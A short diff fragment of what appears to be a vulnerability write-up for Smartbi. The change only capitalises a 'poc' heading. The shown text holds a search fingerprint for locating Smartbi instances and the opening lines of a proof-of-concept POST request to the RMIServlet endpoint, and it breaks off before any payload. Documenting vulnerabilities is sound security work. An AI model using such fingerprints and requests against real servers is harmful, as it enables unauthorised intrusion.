@@ -5,7 +5,7 @@
 body="gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')"
 ```
 
-## poc
+## POC
 ```
 POST /smartbi/vision/RMIServlet HTTP/1.1
 Host: 172.16.170.231:18080
